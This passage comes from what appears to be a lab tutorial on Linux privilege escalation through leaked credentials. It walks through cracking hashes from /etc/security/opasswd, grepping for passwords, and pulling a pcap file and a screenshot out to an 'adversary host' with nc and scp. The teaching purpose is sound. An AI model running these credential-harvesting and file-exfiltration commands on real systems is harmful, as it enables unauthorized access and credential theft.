<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ sudo cat /etc/security/opasswd
</span></span><span class="line"><span class="cl">user:1000:3:<span class="nv">$1$xxxxxxxxxxxxxxxxxxxxxxx</span>,<span class="nv">$1$xxxxxxxxxxxxxxxxxxx</span>,<span class="nv">$1$xxxxxxxxxxxxxxxxxxxxxxxx</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Each of these hashes belongs to a different password.</p>
<p>I&rsquo;m going to copy the hash of the last password hash and copy it to my adversary host:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ <span class="nb">echo</span> <span class="s1">&#39;$1$xxxxxxxxxxxxxxxxxxxxxx/&#39;</span> &gt; hash.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now I&rsquo;m going to use <code>John</code> to attempt to crack the password hash using a dictionary attack:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt hash.txt
</span></span><span class="line"><span class="cl">&lt;SNIP&gt;
</span></span><span class="line"><span class="cl">p@<span class="nv">$$</span>w0rd!     <span class="o">(</span>?<span class="o">)</span>
</span></span><span class="line"><span class="cl">&lt;SNIP&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">❯ john hash.txt --show
</span></span><span class="line"><span class="cl">?:p@<span class="nv">$$</span>w0rd!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="m">1</span> password <span class="nb">hash</span> cracked, <span class="m">0</span> left
</span></span></code></pre></td></tr></table>
</div>
</div><p>As we can see the old password <code>p@$$w0rd!</code> was cracked. If this password was still in use by another user or if the administrator disabled this PAM functionality but forgot that the previous passwords were stored in the <code>/etc/security/opasswd</code> file and he/she decided to use an old password for a higher privileged user. We could attempt to switch to that user or at least try to log in as another user with the password that just cracked. Again this is just an example.</p>
<p>At this step, I recommend that we restore a snapshot.</p>
<h1 id="privilege-escalation-via-plain-text-files-containing-passwords">Privilege Escalation via Plain Text Files Containing Passwords</h1>
<p>Filter for the string password (case insensitive) in all file types and add some color:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">grep --color<span class="o">=</span>auto -rnw <span class="s1">&#39;/&#39;</span> -ie <span class="s1">&#39;PASSWORD&#39;</span> --color<span class="o">=</span>always 2&gt;/dev/null
</span></span></code></pre></td></tr></table>
</div>
</div><p>Find files and filter for the string password while being case insensitive:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">find . -type f -exec grep -io -I <span class="s2">&#34;password&#34;</span> <span class="o">{}</span> /dev/null <span class="se">\;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="plain-text-file-scenario">Plain Text File Scenario</h3>
<p>We will simply save a password into a text file:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s1">&#39;Passwords:\n\tRoot user password is: pass123\n&#39;</span> &gt; /home/user/Desktop/password.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p>This is how the output of the file <code>password.txt</code> looks:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ cat /home/user/Desktop/password.txt
</span></span><span class="line"><span class="cl">Passwords:
</span></span><span class="line"><span class="cl">	Root user password is: pass123
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now let&rsquo;s change to the adversary&rsquo;s perspective, startup by searching for the string <code>password</code> on all the system files:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ find . -type f -exec grep -io -I <span class="s2">&#34;password&#34;</span> <span class="o">{}</span> /dev/null <span class="se">\;</span>
</span></span><span class="line"><span class="cl">./Desktop/password.txt:Password
</span></span><span class="line"><span class="cl">./Desktop/password.txt:password
</span></span><span class="line"><span class="cl">&lt;SNIP&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Looking at the first two lines of the output above, we can see the file that we created earlier. The next step would be to check if we have read permissions on this file:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ ls -l ./Desktop/password.txt
</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> user user <span class="m">44</span> Jan  <span class="m">5</span> 16:23 ./Desktop/password.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p>Viewing the output above, we can see that we have read permissions, now we can read the file and see if it contains passwords:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ cat ./Desktop/password.txt
</span></span><span class="line"><span class="cl">Passwords:
</span></span><span class="line"><span class="cl">	Root user password is: pass123
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">user@pwn:~$ 
</span></span></code></pre></td></tr></table>
</div>
</div><p>It seems that the root password is <code>pass123</code>, let&rsquo;s try to switch to the root user and log in with this password:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ su root
</span></span><span class="line"><span class="cl">Password: 
</span></span><span class="line"><span class="cl">root@pwn:/home/user# whoami
</span></span><span class="line"><span class="cl">root
</span></span><span class="line"><span class="cl">root@pwn:/home/user# id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span><span class="line"><span class="cl">root@pwn:/home/user# 
</span></span></code></pre></td></tr></table>
</div>
</div><p>As we can see, we were able to escalate privileges by simply finding a password string in a file called <code>password.txt</code> which is stored on the user&rsquo;s desktop. This is a common misconfiguration that client users might do on their workstations. As system administrators, we shall know that this is very <strong>uncommon</strong> or at least it should be avoided.</p>
<h1 id="privilege-escalation-via-network-packets">Privilege Escalation via Network Packets</h1>
<p>Let&rsquo;s not forget one of the most basic things when it comes to information security and that is protocols that are not encrypted. Yes, we may be able to capture some traffic of a protocol like FTP, HTTP or Telnet, someone logins and we capture those credentials. Sometimes system administrators that are monitoring the network may forget that they have stored some of these captures in PCAP files. If an adversary manages to compromise the system and read one of these captures he/she may find some valid credentials.</p>
<h3 id="wireshark-capture-scenario-ftp">Wireshark Capture Scenario (FTP)</h3>
<p>Startup by installing an FTP service and a Network Sniffer in this case Wireshark:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo apt update <span class="o">&amp;&amp;</span> sudo apt install -y vsftpd wireshark 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now let&rsquo;s configure the FTP service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo vim /etc/vsftpd
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now add or uncomment the following lines (if already added in the file):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nv">listen</span><span class="o">=</span>NO  
</span></span><span class="line"><span class="cl"><span class="nv">anonymous_enable</span><span class="o">=</span>NO  
</span></span><span class="line"><span class="cl"><span class="nv">local_enable</span><span class="o">=</span>YES  
</span></span><span class="line"><span class="cl"><span class="nv">write_enable</span><span class="o">=</span>YES  
</span></span><span class="line"><span class="cl"><span class="nv">local_umask</span><span class="o">=</span><span class="m">022</span>  
</span></span><span class="line"><span class="cl"><span class="nv">dirmessage_enable</span><span class="o">=</span>YES  
</span></span><span class="line"><span class="cl"><span class="nv">use_localtime</span><span class="o">=</span>YES  
</span></span><span class="line"><span class="cl"><span class="nv">xferlog_enable</span><span class="o">=</span>YES  
</span></span><span class="line"><span class="cl"><span class="nv">connect_from_port_20</span><span class="o">=</span>YES  
</span></span><span class="line"><span class="cl"><span class="nv">chroot_local_user</span><span class="o">=</span>YES  
</span></span><span class="line"><span class="cl"><span class="nv">secure_chroot_dir</span><span class="o">=</span>/var/run/vsftpd/empty  
</span></span><span class="line"><span class="cl"><span class="nv">pam_service_name</span><span class="o">=</span>vsftpd  
</span></span><span class="line"><span class="cl"><span class="c1">#rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem  </span>
</span></span><span class="line"><span class="cl"><span class="c1">#rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key  </span>
</span></span><span class="line"><span class="cl"><span class="nv">ssl_enable</span><span class="o">=</span>No  
</span></span><span class="line"><span class="cl"><span class="nv">pasv_enable</span><span class="o">=</span>Yes  
</span></span><span class="line"><span class="cl"><span class="nv">pasv_min_port</span><span class="o">=</span><span class="m">10000</span>  
</span></span><span class="line"><span class="cl"><span class="nv">pasv_max_port</span><span class="o">=</span><span class="m">10100</span>  
</span></span><span class="line"><span class="cl"><span class="nv">allow_writeable_chroot</span><span class="o">=</span>YES  
</span></span><span class="line"><span class="cl"><span class="nv">ssl_tlsv1</span><span class="o">=</span>NO  
</span></span><span class="line"><span class="cl"><span class="nv">ssl_sslv2</span><span class="o">=</span>NO  
</span></span><span class="line"><span class="cl"><span class="nv">ssl_sslv3</span><span class="o">=</span>NO
</span></span></code></pre></td></tr></table>
</div>
</div><p>Once done, save and close the <code>/etc/vsftpd.conf</code> file.</p>
<p>Run the service and check its status:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo systemctl <span class="nb">enable</span> vsftpd.service <span class="o">&amp;&amp;</span> sudo systemctl restart vsftpd.service <span class="o">&amp;&amp;</span> sudo systemctl status vsftpd.service
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now run wireshark in the localhost interface card:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo wireshark
</span></span></code></pre></td></tr></table>
</div>
</div><p>Select the loopback interface:</p>
<figure><a class="lightgallery" href="/images/posts/wireshark-loopback.png" title="/images/posts/wireshark-loopback.png" data-thumbnail="/images/posts/wireshark-loopback.png" data-sub-html="<h2>Wireshark Loopback</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/wireshark-loopback.png"
            data-srcset="/images/posts/wireshark-loopback.png, /images/posts/wireshark-loopback.png 1.5x, /images/posts/wireshark-loopback.png 2x"
            data-sizes="auto"
            alt="/images/posts/wireshark-loopback.png" />
    </a><figcaption class="image-caption">Wireshark Loopback</figcaption>
    </figure>
<p>Test FTP connection locally:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ ftp localhost
</span></span><span class="line"><span class="cl">Connected to localhost.
</span></span><span class="line"><span class="cl"><span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
</span></span><span class="line"><span class="cl">Name <span class="o">(</span>localhost:user<span class="o">)</span>: user
</span></span><span class="line"><span class="cl"><span class="m">331</span> Please specify the password.
</span></span><span class="line"><span class="cl">Password: <span class="c1"># pass321</span>
</span></span><span class="line"><span class="cl"><span class="m">230</span> Login successful.
</span></span><span class="line"><span class="cl">Remote system <span class="nb">type</span> is UNIX.
</span></span><span class="line"><span class="cl">Using binary mode to transfer files.
</span></span><span class="line"><span class="cl">ftp&gt; 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Capture the FTP packets in the loopback interface and follow the TCP stream and save the capture. Then change the ownership of the file to our user and group:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ sudo chown user:user /home/user/Desktop/ftp-creds.pcapng
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now from the adversary&rsquo;s perspective, we can enumerate pcap files:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ find / -name <span class="s1">&#39;*.pcap*&#39;</span> 2&gt;/dev/null <span class="p">|</span> grep -v snap
</span></span><span class="line"><span class="cl">/home/user/Desktop/ftp-creds.pcapng
</span></span><span class="line"><span class="cl">/usr/share/mime/application/vnd.tcpdump.pcap.xml
</span></span></code></pre></td></tr></table>
</div>
</div><p>We found the file <code>/home/user/Desktop/ftp-creds.pcapng</code> let&rsquo;s attempt to transfer this file to our adversary host.</p>
<p>The last time we did a file transfer we used <code>scp</code>, this time around I&rsquo;m going to use <code>nc</code>  just to keep things different:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ which nc
</span></span><span class="line"><span class="cl">/usr/bin/nc
</span></span></code></pre></td></tr></table>
</div>
</div><p>Set up a listener on your adversary host:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ nc -l -p <span class="m">1234</span> &gt; ftp-creds.pcapng
</span></span></code></pre></td></tr></table>
</div>
</div><p>Send the <code>pcapng</code> file to the adversary host:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo nc -w <span class="m">3</span> 10.10.10.15 <span class="m">1234</span> &lt; /home/user/Desktop/ftp-creds.pcapng
</span></span></code></pre></td></tr></table>
</div>
</div><p>Verify the checksum on the victim/target host/machine:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ md5sum /home/user/Desktop/ftp-creds.pcapng
</span></span><span class="line"><span class="cl">xxxxxxxxxxxxxxxx  /home/user/Desktop/ftp-creds.pcapng
</span></span></code></pre></td></tr></table>
</div>
</div><p>Verify the checksum on our adversary host/machine:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ md5sum ftp-creds.pcapng
</span></span><span class="line"><span class="cl">xxxxxxxxxxxxxxxx  ftp-creds.pcapng
</span></span></code></pre></td></tr></table>
</div>
</div><p>The hashes are the same which means that the integrity of the file is the same which means that they are the same files.</p>
<p>Now let&rsquo;s open wireshark in our adversary host/machine:</p>
<figure><a class="lightgallery" href="/images/posts/open-wireshark-capture.png" title="/images/posts/open-wireshark-capture.png" data-thumbnail="/images/posts/open-wireshark-capture.png" data-sub-html="<h2>Open Wireshark Capture</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/open-wireshark-capture.png"
            data-srcset="/images/posts/open-wireshark-capture.png, /images/posts/open-wireshark-capture.png 1.5x, /images/posts/open-wireshark-capture.png 2x"
            data-sizes="auto"
            alt="/images/posts/open-wireshark-capture.png" />
    </a><figcaption class="image-caption">Open Wireshark Capture</figcaption>
    </figure>
<p>Follow the TCP stream of the capture to find the credentials.</p>
<h1 id="privilege-escalation-via-images">Privilege Escalation via Images</h1>
<p>Screenshots or pictures/photos of credentials is very a common mistake that could happen anywhere.</p>
<h3 id="screenshot-scenario">Screenshot Scenario</h3>
<p>To demonstrate this example, I&rsquo;m going to use <code>flameshot</code> to take a screenshot. we can use any screenshot tool.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo apt update <span class="o">&amp;&amp;</span> sudo apt install flameshot
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then I&rsquo;m going to execute <code>flameshot</code>:</p>
<figure><a class="lightgallery" href="/images/posts/flameshot-icon.png" title="/images/posts/flameshot-icon.png" data-thumbnail="/images/posts/flameshot-icon.png" data-sub-html="<h2>Flameshot Icon</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/flameshot-icon.png"
            data-srcset="/images/posts/flameshot-icon.png, /images/posts/flameshot-icon.png 1.5x, /images/posts/flameshot-icon.png 2x"
            data-sizes="auto"
            alt="/images/posts/flameshot-icon.png" />
    </a><figcaption class="image-caption">Flameshot Icon</figcaption>
    </figure>
<p>Now I&rsquo;m going to take a screenshot:</p>
<figure><a class="lightgallery" href="/images/posts/take-screenshot.png" title="/images/posts/take-screenshot.png" data-thumbnail="/images/posts/take-screenshot.png" data-sub-html="<h2>Flameshot Take Screenshot</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/take-screenshot.png"
            data-srcset="/images/posts/take-screenshot.png, /images/posts/take-screenshot.png 1.5x, /images/posts/take-screenshot.png 2x"
            data-sizes="auto"
            alt="/images/posts/take-screenshot.png" />
    </a><figcaption class="image-caption">Flameshot Take Screenshot</figcaption>
    </figure>
<p>Select the area that we want to screenshot. Use any text editor of your choosing.</p>
<figure><a class="lightgallery" href="/images/posts/screenshot-password.png" title="/images/posts/screenshot-password.png" data-thumbnail="/images/posts/screenshot-password.png" data-sub-html="<h2>Flameshot Screenshot Password</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/screenshot-password.png"
            data-srcset="/images/posts/screenshot-password.png, /images/posts/screenshot-password.png 1.5x, /images/posts/screenshot-password.png 2x"
            data-sizes="auto"
            alt="/images/posts/screenshot-password.png" />
    </a><figcaption class="image-caption">Flameshot Screenshot Password</figcaption>
    </figure>
<p>Save it to the Pictures directory:</p>
<figure><a class="lightgallery" href="/images/posts/password-png.png" title="/images/posts/password-png.png" data-thumbnail="/images/posts/password-png.png" data-sub-html="<h2>Password</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/password-png.png"
            data-srcset="/images/posts/password-png.png, /images/posts/password-png.png 1.5x, /images/posts/password-png.png 2x"
            data-sizes="auto"
            alt="/images/posts/password-png.png" />
    </a><figcaption class="image-caption">Password</figcaption>
    </figure>
<p>From the adversary&rsquo;s perspective we can see this image stored in the <code>/home/user/Pictures</code> directory:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ ls -l Pictures/
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> user user <span class="m">7955</span> Jan  <span class="m">5</span> 20:43 password.png
</span></span></code></pre></td></tr></table>
</div>
</div><p>As we can see from the above this looks very interesting, as an adversary we could try to transfer this image to our adversary host. There are many ways in which we could transfer files. I&rsquo;m just going to keep it simple by using scp. Let&rsquo;s check if scp is installed in the target/victim machine:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ which scp
</span></span><span class="line"><span class="cl">/usr/bin/scp
</span></span><span class="line"><span class="cl">user@pwn:~$ 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now we&rsquo;re going to use the adversary host/machine and view our IP address:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ ip -color<span class="o">=</span>auto --brief address show
</span></span><span class="line"><span class="cl">lo               UNKNOWN        127.0.0.1/8 ::1/128
</span></span><span class="line"><span class="cl">eth0             UP             10.10.10.15/24 fe80::20c:29ff:fec5:fd0/64
</span></span></code></pre></td></tr></table>
</div>
</div><p>Lastly, let&rsquo;s start the SSH service in our adversary host:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ sudo systemctl start ssh <span class="o">&amp;&amp;</span> sudo systemctl status ssh <span class="p">|</span> grep active
</span></span><span class="line"><span class="cl">     Active: active <span class="o">(</span>running<span class="o">)</span> since Wed 2021-01-05 19:51:46 EST<span class="p">;</span> 7min ago
</span></span></code></pre></td></tr></table>
</div>
</div><p>From the victim machine/target let&rsquo;s log in to our SSH service and transfer the file at the same time with scp:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ scp /home/user/Pictures/password.png kali@10.10.10.15:/home/kali/Pictures
</span></span><span class="line"><span class="cl">The authenticity of host <span class="s1">&#39;10.10.10.15 (10.10.10.15)&#39;</span> can<span class="s1">&#39;t be established.
</span></span></span><span class="line"><span class="cl"><span class="s1">ECDSA key fingerprint is SHA256:+sekweCXMu7Qr1XeTiYW4Ucu6gvZVtcBJy7UtbzemsI.
</span></span></span><span class="line"><span class="cl"><span class="s1">Are we sure we want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span class="line"><span class="cl"><span class="s1">Warning: Permanently added &#39;</span>10.10.10.15<span class="s1">&#39; (ECDSA) to the list of known hosts.
</span></span></span><span class="line"><span class="cl"><span class="s1">kali@10.10.10.15&#39;</span>s password: 
</span></span><span class="line"><span class="cl">password.png                                                                                                                                100% <span class="m">7955</span>     6.6MB/s   00:00    
</span></span><span class="line"><span class="cl">user@pwn:~$ 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now in our adversary host/machine, let&rsquo;s navigate to the <code>/home/kali/Pictures</code> directory:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ ls -l ~/Pictures <span class="p">|</span> grep password
</span></span><span class="line"><span class="cl">.rw-r--r-- kali kali 7.8 KB Wed Jan  <span class="m">5</span> 20:01:31 <span class="m">2021</span> password.png
</span></span></code></pre></td></tr></table>
</div>
</div><p>As we can see from the output above, the image has been transferred. Let&rsquo;s open this image with an image viewer:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ which ristretto
</span></span><span class="line"><span class="cl">/usr/bin/ristretto
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">❯ ristretto /home/kali/Pictures/password.png
</span></span></code></pre></td></tr></table>
</div>
</div><p>The image has been opened and now we can see its contents:</p>
<figure><a class="lightgallery" href="/images/posts/image-password.png" title="/images/posts/image-password.png" data-thumbnail="/images/posts/image-password.png" data-sub-html="<h2>Image Password</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/image-password.png"
            data-srcset="/images/posts/image-password.png, /images/posts/image-password.png 1.5x, /images/posts/image-password.png 2x"
            data-sizes="auto"
            alt="/images/posts/image-password.png" />
    </a><figcaption class="image-caption">Image Password</figcaption>
    </figure>
<p>Now we know a potential password. We could try to use a password re-use technique or simply try to switch to the root user with this password that we found.</p>
<h1 id="privilege-escalation-via-history-files">Privilege Escalation via History Files</h1>
<p>We might see credentials in the console/shell history, sometimes some people do enter credentials to command parameters as arguments. This can be seen when someone wants to connect remotely to a database without interaction when using commands like <code>sshpass</code> or <code>mysql</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
